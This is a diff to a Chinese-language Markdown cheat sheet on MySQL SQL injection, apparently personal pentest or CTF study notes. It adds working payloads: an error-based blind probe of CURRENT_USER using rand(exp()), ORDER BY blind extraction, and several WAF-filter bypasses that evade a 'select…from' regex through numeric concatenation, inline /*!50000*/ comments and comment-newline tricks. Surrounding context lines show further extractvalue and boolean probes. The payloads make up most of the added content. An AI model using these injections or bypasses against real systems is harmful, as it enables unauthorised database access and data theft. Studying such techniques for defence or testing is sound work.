@@ -377,6 +377,16 @@ insert into users(username, password) values
   * OOB注入:
   * 写文件(前提是数据库可以被我们污染):
 
+**payload**
+
+```mysql
+(case when substr(CURRENT_USER,1,1)='r' then rand(exp(99999999)) else 1 end)
+
+# 
+```
+
+
+
 #### limit注入
 
 * 没有order by，可以直接union select
@@ -459,11 +469,11 @@ function check_input($con1, $value)
   * `select 123 union /*!50000select*/ '666';` 采用/*! */
   * TODO：编码绕过，这里查了很多的资料，均提到urlencoding、hex和ascii编码可以绕过，但是通过我的实践，这三种编码是不能用于关键字的，不知道是的版本不对还是姿势不对
   
-* 对union的过滤
+* 对union的过滤 
   
-  * ​       
-
 * where的过滤
+
+* 对select和from的过滤
 
 ##### 对特殊字符的过滤
 
@@ -483,7 +493,7 @@ function check_input($con1, $value)
 
 * and  &&
 
-### waf过滤
+
 
 ### 混淆注入
 
@@ -855,4 +865,25 @@ ExtRacTvaLue(1,CoNCAt(char(126),md5(1832632439)))
 1/**/AnD%200=7
 1/**/AnD%200=0
 ```
+
+#### 对select和from的过滤突破
+
+* 使用类似正则`select\s*.*\s*from`，过滤掉了`select+空白字符+from`的组合。不能使用select难以注出表中的字段，可以考虑如下方式绕过
+
+```mysql
+# order by后为注入部分
+SELECT * FROM user_info ORDER BY if(-99=(SELECT-0-ASCII(SUBSTRING('abc123', 3, 1))-0e0from user_info WHERE id=1),EXP(9999999),RAND(1));
+
+# 原理是select可以无需空白字符拼接一些数字型的数据
+select-1-\Nfrom user;
+select-0.0from user;
+select-1-0e0from user;
+
+
+# 此外还有 --\r\n和内联注释
+select--\r\n* from--\r\npg_database;
+/*!50000select*/ * /*!50000from*/user;
+```
+
+
 
